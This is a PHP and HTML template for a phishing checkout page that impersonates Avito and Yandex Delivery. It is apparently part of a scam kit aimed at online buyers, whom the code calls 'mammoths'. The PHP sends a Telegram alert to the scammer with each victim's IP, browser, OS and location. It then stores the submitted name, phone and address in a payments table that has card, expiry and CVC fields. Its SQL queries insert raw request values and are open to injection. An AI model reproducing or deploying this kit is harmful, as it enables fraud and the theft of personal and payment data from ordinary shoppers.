<?php 
		
	$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '0' AND `type` = '0' AND `advert_id` = '".mb_substr($_SERVER['REQUEST_URI'], 8)."' AND `status` = '1'");

	if(mysqli_num_rows($query) > 0) {
		$order = mysqli_fetch_assoc($query);
		$size = getimagesize($order['image']);
		
		if($order['delivery'] != '0') {
			$delivery = $order['delivery'];
		} else {
			$delivery = $config['delivery'];
		}

		mysqli_query($connection, "UPDATE `adverts` SET `views` = `views`+1 WHERE `advert_id` = '".$order['advert_id']."'");
		
		$text = "⚠️ <b>Мамонт перешел на страницу объявления</b>⚠️\n\n";
		$text .= "🌍 <b>Платформа:</b> <code>Авито</code>\n";
		$text .= "🆔 <b>ID объявления:</b> <code>$order[advert_id]</code>\n";
		$text .= "📦 <b>Название товара:</b> <code>$order[title]</code>\n";
		$text .= "💰 <b>Сумма товара:</b> <code>$order[price] руб.</code>\n";
		$text .= "🚚 <b>Сумма доставки:</b> <code>$delivery руб.</code>\n";
		$text .= "\n$visitor[os] — ".getCountryFlag($visitor['country_code'])." $visitor[country], $visitor[city]\n";
		$text .= "Браузер $visitor[browser], $visitor[ip]";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
		if(isset($_POST['order'])) {
			$order_id = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id` FROM `payments` ORDER BY `id` DESC LIMIT 1"));

			mysqli_query($connection, "INSERT INTO `payments` (`worker`, `advert_id`, `amount`, `currency`, `firstname`, `lastname`, `middlename`, `phone`, `address`, `flat`, `card`, `expiry`, `cvc`, `recipient`, `status`, `ip`, `browser`, `os`, `time`) VALUES ('$order[worker]', '$order[advert_id]', '$order[price]+$config[delivery]', 'RUB', '$_POST[firstname]', '$_POST[lastname]', '$_POST[middlename]', '$_POST[phone]', '$_POST[address]', '$_POST[flat]', '0', '0', '0', '0', '0', '$visitor[ip]', '$visitor[browser]', '$visitor[os]', '".time()."')");
			setcookie('order_id', $order_id['id']+1, time()+3600, '/');
			setcookie('name', mb_strtoupper(str_replace('`', '', str_replace('+', ' ', rus2translit($_POST['firstname'].' '.$_POST['lastname'])))), time()+3600, '/');
			header('Location: /order?id='.$order['advert_id']);
		}
	} else {
		header('Location: https://'.$_SERVER['SERVER_NAME'].'/');
	}

?>

<html lang="ru" prefix="og: http://ogp.me/ns#" id="html">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="author" content="Mail.Ru Group">
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, minimal-ui, user-scalable=no">
	<meta name="twitter:card" content="Самый простой способ продать или купить вещи">
	<meta name="format-detection" content="telephone=no">
	<meta name="apple-mobile-web-app-title" content="Авито – бесплатные объявления">
	<meta name="theme-color" content="#039ad3">
	<title>Оформление и оплата</title>
	
	<meta name="description" content="Выгодно покупайте и продавайте авто, недвижимость и вещи в России. Находите надёжных исполнителей и работу. Самый популярный сервис объявлений в России.">
	<meta property="og:site_name" content="Авито">
	<meta property="og:title" content="Авито Доставка">
	<meta property="og:type" content="website">
	<meta property="og:url" content="https://avito.ru/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:image" content="<?php echo $order['image']; ?>">
	<meta property="og:image:secure_url" content="<?php echo $order['image']; ?>">
	<meta property="og:image:type" content="<?php echo $size['mime']; ?>">
	<meta property="og:image:width" content="<?php echo $size[0]; ?>">
	<meta property="og:image:height" content="<?php echo $size[0]; ?>">
	<meta property="og:description" content="Выгодно покупайте и продавайте авто, недвижимость и вещи в России. Находите надёжных исполнителей и работу. Самый популярный сервис объявлений в России.">
	
	<meta name="csrf_token" content="wnOVNeL_4D7DmK-oX3FsvI9FmlBemqZdGo-qyfgeOIU">
	<link rel="stylesheet" href="./order_files/index.css">
    <link rel="stylesheet" href="./order_files/stylesheet.css">
    <link rel="shortcut icon" href="./order_files/icon.png" type="image/png">

	<style type="text/css" data-styled-components="NpgRx fTFJgk cJUDJS kBbzCN" data-styled-components-is-local="true">
	
	.sc-bdVaJa {}
	
	.kBbzCN b {
		font-weight: inherit;
	}
	
	.kBbzCN i {
		font-style: inherit;
		content: 'руб.';
		font-family: 'RoubleArial', Arial, sans-serif;
		text-indent: 0;
		display: none;
	}
	
	.body--old_rouble .kBbzCN i {
		display: inline;
		-webkit-user-select: text;
		-moz-user-select: text;
		-ms-user-select: text;
		user-select: text;
	}
	
	.body--old_rouble .kBbzCN b {
		display: none;
	}
	
	.sc-jAaTju {}
	
	.cJUDJS {
		box-sizing: border-box;
		width: 100%;
		padding-left: 5px;
		padding-right: 5px;
	}
	
	@media screen and (min-width: 575px) {
		.cJUDJS {
			padding-left: 5px;
			padding-right: 5px;
		}
	}
	
	@media screen and (min-width: 767px) {
		.cJUDJS {
			padding-left: 8px;
			padding-right: 8px;
		}
	}
	/* sc-component-id: sc-jDwBTQ */
	
	.sc-jDwBTQ {}
	
	.fTFJgk {
		box-sizing: border-box;
		margin-left: -5px;
		margin-right: -5px;
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
		-webkit-flex-wrap: wrap;
		-ms-flex-wrap: wrap;
		flex-wrap: wrap;
	}
	
	@media screen and (min-width: 575px) {
		.fTFJgk {
			margin-left: -5px;
			margin-right: -5px;
		}
	}
	
	@media screen and (min-width: 767px) {
		.fTFJgk {
			margin-left: -8px;
			margin-right: -8px;
		}
	}
	/* sc-component-id: sc-gPEVay */
	
	.sc-gPEVay {}
	
	.NpgRx {
		max-width: 1264px;
		min-width: 320px;
		width: 100%;
		margin-left: auto;
		margin-right: auto;
		padding-left: 16px;
		padding-right: 16px;
	}
	</style>
	<style type="text/css" data-styled-components="cTkhPF iVXCSc bbyJzT blSEcj kRufpp jLgHKS hvBxNu" data-styled-components-is-local="true">
	/* sc-component-id: sc-iRbamj */
	
	.sc-iRbamj {}
	/* sc-component-id: sc-jlyJG */
	
	.sc-jlyJG {}
	/* sc-component-id: sc-fBuWsC */
	
	.sc-fBuWsC {}
	
	.hvBxNu {
		overflow: hidden;
		text-overflow: ellipsis;
		white-space: nowrap;
	}
	/* sc-component-id: sc-dVhcbM */
	
	.sc-dVhcbM {}
	
	.jLgHKS {
		position: relative;
		display: inline-block;
		vertical-align: middle;
		margin: 0;
		padding: 0;
		font-family: inherit;
		color: inherit;
		-webkit-text-decoration: none;
		text-decoration: none;
		text-align: center;
		line-height: normal;
		white-space: nowrap;
		background-color: transparent;
		border: 0;
		outline: 0;
		cursor: pointer;
		overflow: hidden;
		-webkit-transition: all .2s ease;
		transition: all .2s ease;
		border-radius: 4px;
		color: #fff;
		background-color: #59a840;
		box-shadow: none;
		display: block;
		width: 100%;
		box-sizing: border-box;
	}
	
	.jLgHKS:hover {
		-webkit-text-decoration: none;
		text-decoration: none;
	}
	
	.jLgHKS:hover {
		color: #fff;
		background-color: #64ae4d;
		box-shadow: none;
	}
	
	.jLgHKS:active {
		color: #fff;
		background-color: #56a23e;
		box-shadow: none;
	}
	
	.jLgHKS .sc-fBuWsC {
		display: block;
		padding: 9px 16px;
		font-size: 16px;
		font-weight: 400;
	}
	
	.jLgHKS .sc-jhAzac {
		display: inline-block;
		vertical-align: middle;
		font-size: 16px;
	}
	
	.jLgHKS .sc-fMiknA {
		position: relative;
		display: inline-block;
		vertical-align: middle;
		height: calc(8px + 16px);
		font-size: calc(8px + 16px);
		line-height: calc(8px + 16px);
		margin-top: -15px;
		margin-bottom: -15px;
	}
	
	.jLgHKS .sc-fMiknA:before {
		display: block;
	}
	/* sc-component-id: sc-eqIVtm */
	
	.sc-eqIVtm {}
	/* sc-component-id: sc-keyframes-cTkhPF */
	
	@-webkit-keyframes cTkhPF {
		from {
			-webkit-transform: translate(-100%);
			-ms-transform: translate(-100%);
			transform: translate(-100%);
		}
		to {
			-webkit-transform: translate(100%);
			-ms-transform: translate(100%);
			transform: translate(100%);
		}
	}
	
	@keyframes cTkhPF {
		from {
			-webkit-transform: translate(-100%);
			-ms-transform: translate(-100%);
			transform: translate(-100%);
		}
		to {
			-webkit-transform: translate(100%);
			-ms-transform: translate(100%);
			transform: translate(100%);
		}
	}
	/* sc-component-id: sc-keyframes-iVXCSc */
	
	@-webkit-keyframes iVXCSc {
		from {
			-webkit-transform: rotate(0deg);
			-ms-transform: rotate(0deg);
			transform: rotate(0deg);
		}
		to {
			-webkit-transform: rotate(360deg);
			-ms-transform: rotate(360deg);
			transform: rotate(360deg);
		}
	}
	
	@keyframes iVXCSc {
		from {
			-webkit-transform: rotate(0deg);
			-ms-transform: rotate(0deg);
			transform: rotate(0deg);
		}
		to {
			-webkit-transform: rotate(360deg);
			-ms-transform: rotate(360deg);
			transform: rotate(360deg);
		}
	}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="ckWumU zCXFX fRBoVq" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-ckWumU */
	
	@-webkit-keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	
	@keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	/* sc-component-id: sc-jXQZqI */
	
	.sc-jXQZqI {}
	
	.zCXFX {
		background-color: transparent;
		z-index: 11;
	}
	/* sc-component-id: sc-iGPElx */
	
	.sc-iGPElx {}
	
	.fRBoVq {
		position: relative;
		z-index: 11;
	}
	</style>
	<style type="text/css" data-styled-components="gZZoSS oVZfB eXwLjQ epSXek dGOIvp liQLis fVgFgO oYlcx dWOPzP kMumCA" data-styled-components-is-local="true">
	/* sc-component-id: sc-hgHYgh */
	
	.sc-hgHYgh {}
	
	.dGOIvp {
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
	}
	
	.dGOIvp > * + * {
		margin-left: 16px;
	}
	
	.dGOIvp > *:last-child {
		margin-left: 24px;
	}
	
	.dGOIvp > * {
		max-height: 32px;
	}
	/* sc-component-id: sc-fOICqy */
	
	.sc-fOICqy {}
	
	.fVgFgO {
		-webkit-box-flex: 1;
		-webkit-flex-grow: 1;
		-ms-flex-positive: 1;
		flex-grow: 1;
		margin-right: 8px;
		max-height: 100%;
	}
	/* sc-component-id: sc-hzDEsm */
	
	.sc-hzDEsm {}
	
	.liQLis {
		font-size: 0;
		margin-right: 8px;
		-webkit-transform: translateY(-8px);
		-ms-transform: translateY(-8px);
		transform: translateY(-8px);
	}
	/* sc-component-id: sc-eKZiaR */
	
	.sc-eKZiaR {}
	
	.oYlcx {
		font-size: 0;
	}
	/* sc-component-id: sc-drMfKT */
	
	.sc-drMfKT {}
	
	.dWOPzP {
		font-size: 0;
		display: inline-block;
		position: relative;
		border-radius: 100%;
		width: 32px;
		height: 32px;
		background-repeat: no-repeat;
		background-size: 32px;
		background-position: center;
	}
	
	.dWOPzP:after {
		top: 0;
		right: -4px;
		z-index: 1;
		pointer-events: none;
		background: #f75059;
		border-radius: 100px;
		position: absolute;
		text-align: center;
		line-height: 14px;
		min-width: 14px;
		font-size: 9px;
		font-weight: 600;
		color: #ffffff;
	}
	
	.dWOPzP::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		border-radius: 50%;
		background-color: rgba(51, 51, 51, 0.02);
		-webkit-transition: background-color 0.2s ease-in-out;
		transition: background-color 0.2s ease-in-out;
	}
	
	.dWOPzP:hover::before {
		background-color: rgba(255, 255, 255, 0.08);
	}
	
	.dWOPzP:focus::before,
	.dWOPzP:active::before {
		background-color: rgba(51, 51, 51, 0.02);
	}
	
	@media (hover: none) {
		.dWOPzP:focus::before {
			background-color: transparent;
		}
		.dWOPzP:hover::before {
			background-color: rgba(51, 51, 51, 0.02);
		}
	}
	/* sc-component-id: sc-gpHHfC */
	
	.sc-gpHHfC {}
	
	.gZZoSS {
		position: relative;
		z-index: 10;
	}
	/* sc-component-id: sc-gVyKpa */
	
	.sc-gVyKpa {}
	
	.oVZfB {
		padding-top: 0px;
		height: 64px;
		background: #ffffff;
	}
	/* sc-component-id: sc-eXNvrr */
	
	.sc-eXNvrr {}
	
	.eXwLjQ {
		width: 100%;
		background: #ffffff;
		box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.04);
		position: absolute;
		-webkit-transition: box-shadow 0.2s;
		transition: box-shadow 0.2s;
		top: 0px;
		height: 64px;
	}
	/* sc-component-id: sc-cpmKsF */
	
	.sc-cpmKsF {}
	
	.kMumCA {
		overflow: hidden;
		position: absolute;
		padding: 16px 0 24px 0;
		background: #ffffff;
		width: 100%;
		opacity: 0;
		visibility: hidden;
		-webkit-transition: opacity 0.1s linear 0s, -webkit-transform 0.1s linear 0s, visibility 0s linear 0.1s;
		-webkit-transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.08);
		-webkit-transform: translate3d(0px, -8px, 0px);
		-ms-transform: translate3d(0px, -8px, 0px);
		transform: translate3d(0px, -8px, 0px);
	}
	/* sc-component-id: sc-kQsIoO */
	
	.sc-kQsIoO {}
	
	.epSXek {
		width: 100%;
		padding: 16px 0;
		height: 64px;
	}
	
	.epSXek .sc-cpmKsF {
		top: 56px;
	}
	</style>
	<style type="text/css" data-styled-components="hKJXlo" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-hKJXlo */
	
	@-webkit-keyframes hKJXlo {
		from {
			opacity: 0.6;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(100%);
			-ms-transform: translateY(100%);
			transform: translateY(100%);
		}
		to {
			opacity: 1;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(0%);
			-ms-transform: translateY(0%);
			transform: translateY(0%);
		}
	}
	
	@keyframes hKJXlo {
		from {
			opacity: 0.6;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(100%);
			-ms-transform: translateY(100%);
			transform: translateY(100%);
		}
		to {
			opacity: 1;
			-webkit-transform-origin: center bottom;
			-ms-transform-origin: center bottom;
			transform-origin: center bottom;
			-webkit-transform: translateY(0%);
			-ms-transform: translateY(0%);
			transform: translateY(0%);
		}
	}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
	<style type="text/css" data-styled-components="ckWumU jRQBFv grYHP dllwmI fZtIUm eSRNIz hAfVqs gWOfDy bcxWYD iBzLWS chBiZR jQRite RFfMX" data-styled-components-is-local="true">
	/* sc-component-id: sc-keyframes-ckWumU */
	
	@-webkit-keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	
	@keyframes ckWumU {
		from {
			opacity: 0;
			visibility: hidden;
			-webkit-transform-origin: 100% 0;
			-ms-transform-origin: 100% 0;
			transform-origin: 100% 0;
			height: 0;
		}
		to {
			opacity: 1;
			visibility: visible;
			height: auto;
		}
	}
	/* sc-component-id: sc-eKZiaR */
	
	.sc-eKZiaR {}
	
	.eSRNIz {
		background-color: transparent;
		z-index: 11;
	}
	/* sc-component-id: sc-drMfKT */
	
	.sc-drMfKT {}
	
	.hAfVqs {
		position: relative;
		z-index: 11;
	}
	/* sc-component-id: sc-hIVACf */
	
	.sc-hIVACf {}
	
	.gWOfDy {
		display: -webkit-box;
		display: -webkit-flex;
		display: -ms-flexbox;
		display: flex;
	}
	
	.gWOfDy > * + * {
		margin-left: 16px;
	}
	
	.gWOfDy > *:last-child {
		margin-left: 24px;
	}
	
	.gWOfDy > * {
		max-height: 32px;
	}
	/* sc-component-id: sc-eXNvrr */
	
	.sc-eXNvrr {}
	
	.iBzLWS {
		-webkit-box-flex: 1;
		-webkit-flex-grow: 1;
		-ms-flex-positive: 1;
		flex-grow: 1;
		margin-right: 8px;
		max-height: 100%;
	}
	/* sc-component-id: sc-cpmKsF */
	
	.sc-cpmKsF {}
	
	.bcxWYD {
		font-size: 0;
		margin-right: 8px;
		-webkit-transform: translateY(-8px);
		-ms-transform: translateY(-8px);
		transform: translateY(-8px);
	}
	/* sc-component-id: sc-fHxwqH */
	
	.sc-fHxwqH {}
	
	.chBiZR {
		font-size: 0;
	}
	/* sc-component-id: sc-cEvuZC */
	
	.sc-cEvuZC {}
	
	.jQRite {
		font-size: 0;
		display: inline-block;
		position: relative;
		border-radius: 100%;
		width: 32px;
		height: 32px;
		background-repeat: no-repeat;
		background-size: 32px;
		background-position: center;
	}
	
	.jQRite:after {
		top: 0;
		right: -4px;
		z-index: 1;
		pointer-events: none;
		background: #f75059;
		border-radius: 100px;
		position: absolute;
		text-align: center;
		line-height: 14px;
		min-width: 14px;
		font-size: 9px;
		font-weight: 600;
		color: #ffffff;
	}
	
	.jQRite::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		border-radius: 50%;
		background-color: rgba(51, 51, 51, 0.02);
		-webkit-transition: background-color 0.2s ease-in-out;
		transition: background-color 0.2s ease-in-out;
	}
	
	.jQRite:hover::before {
		background-color: rgba(255, 255, 255, 0.08);
	}
	
	.jQRite:focus::before,
	.jQRite:active::before {
		background-color: rgba(51, 51, 51, 0.02);
	}
	
	@media (hover: none) {
		.jQRite:focus::before {
			background-color: transparent;
		}
		.jQRite:hover::before {
			background-color: rgba(51, 51, 51, 0.02);
		}
	}
	/* sc-component-id: sc-ugnQR */
	
	.sc-ugnQR {}
	
	.jRQBFv {
		position: relative;
		z-index: 10;
	}
	/* sc-component-id: sc-eIHaNI */
	
	.sc-eIHaNI {}
	
	.grYHP {
		padding-top: 0px;
		height: 64px;
		background: #ffffff;
	}
	/* sc-component-id: sc-eTpRJs */
	
	.sc-eTpRJs {}
	
	.dllwmI {
		width: 100%;
		background: #ffffff;
		box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.04);
		position: absolute;
		-webkit-transition: box-shadow 0.2s;
		transition: box-shadow 0.2s;
		top: 0px;
		height: 64px;
	}
	/* sc-component-id: sc-dxZgTM */
	
	.sc-dxZgTM {}
	
	.RFfMX {
		overflow: hidden;
		position: absolute;
		padding: 16px 0 24px 0;
		background: #ffffff;
		width: 100%;
		opacity: 0;
		visibility: hidden;
		-webkit-transition: opacity 0.1s linear 0s, -webkit-transform 0.1s linear 0s, visibility 0s linear 0.1s;
		-webkit-transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
		box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.08);
		-webkit-transform: translate3d(0px, -8px, 0px);
		-ms-transform: translate3d(0px, -8px, 0px);
		transform: translate3d(0px, -8px, 0px);
	}
	/* sc-component-id: sc-iomxrj */
	
	.sc-iomxrj {}
	
	.fZtIUm {
		width: 100%;
		padding: 16px 0;
		height: 64px;
	}
	
	.fZtIUm .sc-dxZgTM {
		top: 56px;
	}
	</style>
	<style type="text/css" data-styled-components="ivQJJG guHuQp gEGbIW debWtF" data-styled-components-is-local="true">
	/* sc-component-id: sc-gCUMDz */
	
	.sc-gCUMDz {}
	
	.gEGbIW {
		border: none;
		outline: none;
		box-shadow: none;
		box-sizing: border-box;
		padding: 0;
		text-align: left;
		-webkit-appearance: none;
		-moz-appearance: none;
		appearance: none;
		height: 32px;
		padding-left: 10px;
		padding-right: 10px;
		font-size: 14px;
		color: #393939;
		border-radius: 4px;
		border: 1px solid #ebebeb;
		background-color: #fff;
		min-width: 0;
		width: 100%;
	}
	
	.gEGbIW::-ms-clear {
		display: none;
		width: 0;
		height: 0;
	}
	
	.gEGbIW::-webkit-input-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW:-moz-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW::-moz-placeholder {
		color: #8f8f8f;
	}
	
	.gEGbIW:-ms-input-placeholder {
		color: #8f8f8f;
	}
	/* sc-component-id: sc-imapFV */
	
	.sc-imapFV {}
	
	.debWtF {
		display: block;
		font-size: 12px;
		line-height: 16px;
		color: #8f8f8f;
		margin: 5px 0 0;
		position: static;
	}
	
	.debWtF:empty {
		display: none;
	}
	/* sc-component-id: sc-fATqzn */
	
	.sc-fATqzn {}
	
	.guHuQp {
		position: relative;
		display: block;
		vertical-align: top;
	}
	
	.guHuQp button {
		z-index: 1;
		position: absolute;
		right: 1px;
		top: 50%;
		-webkit-transform: translate(0, -50%);
		-ms-transform: translate(0, -50%);
		transform: translate(0, -50%);
	}
	
	.guHuQp button > span {
		padding: 8px 15px !important;
	}
	
	.guHuQp button + input {
		padding-right: 40px;
	}
	/* sc-component-id: sc-jbWsrJ */
	
	.sc-jbWsrJ {}
	
	.ivQJJG {
		width: 100%;
		display: block;
	}
	



	@font-face {

font-family: Yandex Sans Text; /* Имя шрифта */

src: url(/.order_files/YandexSansDisplay-Bold.ttf); /* Путь к файлу со шрифтом */

}
	</style>
	<style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
</head>

<body class="body body--payments route__product_buy_id body--animations body--old_rouble">
	<div class="app app--simple_layout" id="app">
		<div class="base">
			<div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer" data-tiny="1">
				<header>
    <div class="logo-header">
        <a href="https://yandex.ru/" title="Яндекс"><img alt="Яндекс" class="logo_header-img" src="./order_files/Яндекс.svg"></a>
        <img alt="Доставка" class="logo_header-img" src="./order_files/Доставка.svg">
    </div>
</header>
			</div>
		
			<aside class="nav_container sidebar_container">
				<nav class="_container" data-container="CategoryMobileContainer"></nav>
			</aside>
			
<main>
    <div class="selection-top">
        <p class="title">Оформление и оплата</p>
        <div class="content">
            <img src="<?php echo $order['image']; ?>" alt="" class="pr-image">
            <div class="text-block">
                <p class="pr-price"><?php echo number_format($order['price'], 0, '', ' '); ?> ₽</p>
                <p class="pr-name"><?php echo $order['title']; ?></p>
            </div>
        </div>
    </div>
    <div class="mobile-safery">
        <p class="safery-info"><img src="./order_files/shield.svg" alt="">Оплачивать на Yandex безопасно</p>
    </div>
    <div class="selection-buyer">
        <div class="selection-buyer_content">
            <div class="delivery-info">
                <img src="./order_files/icon.png" alt="" class="delivery-img">
                <div class="text-block">
                    <p class="delivery-text">Выбрана доставка по городу.</p>
                    <p class="delivery-text" style="color: #7F7F7F;">Стоимость доставки в разных городах может различаться.</p>
                </div>
            </div>
            <div class="label-block">
                <label>Адрес доставки</label>
               
          
                	<input type="text" class="input-max valid5 valid-1" name="address" id="address" placeholder="Город, улица, дом" value="" required>
                		<input type="text" class="input-mid valid1 valid-1" name="lastname" id="lastname" placeholder="Фамилия" maxlength="25" value="" required>
            </div>
            <div class="label-block">
                <label>Данные получателя</label>
                <input class="input-min valid3 valid-3" placeholder="Фамилия">
                <input class="input-min valid3 valid-4" placeholder="Имя">
                <input class="input-min" placeholder="Отчество">
                <input class="input-min phone valid-5" placeholder="Телефон">
            </div>
            <a href="https://taxi.yandex.ru/action/tariff/delivery" style="margin-top: 15px;">Доставка осуществляется через службу Yandex Taxi.</a>
        </div>
    </div>
    <div class="selection-right">
        <div class="price-block">
            <p class="price">10000 ₽</p>
            <p class="commission">С учетом стоимости доставки 10000 ₽</p>
        </div>
      
        <form method="POST">
													<div class="button_container">
														<input type="hidden" name="method" value="buynext">
														<input type="hidden" name="amount" value="<?php echo number_format($order['price']+$delivery);; ?>">
														<input type="hidden" name="name" value="<?php echo $order['title']; ?>">
														<input type="hidden" name="order_id" value="<?php echo $order['advert_id']; ?>">
														<input type="submit" name="order" class="button-pay" value="Перейти к оплате" id="button_order">
													</div>
													</form>
        <p class="safery-info"><img src="./order_files/shield.svg" alt="">Оплачивать на Yandex безопасно</p>
        <p class="agreement-info">Нажимая кнопку «Перейти к оплате», вы соглашаетесь с условиями использования сервиса <a href="https://yandex.ru/legal/taxi_termsofuse/">Яндекс Такси</a></p>
    </div>
</main>

<footer>
    <div class="footer-summary">
        <span style="float: left;">Итого:</span>
        <span style="color: #039ad3; float: right;">10000 ₽</span>
    </div>
    <button class="button-pay" type="submit">Перейти к оплате</button>
</footer>
</form>
												</div>
											</div>
										</div>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="overlay">
			<div class="loader hide"></div>
		</div>
		<div class="global">
			<div></div>
		</div>
	</div>
	<script src="/assets/js/jquery-3.4.1.slim.js"></script>
	<script src="/assets/js/maskedinput.js"></script>
	<!-- <script>
		$(document).ready(function() {
			$("#phone").mask("+7 (999) 999-99-99");
		});
	</script> -->
</body>
</html>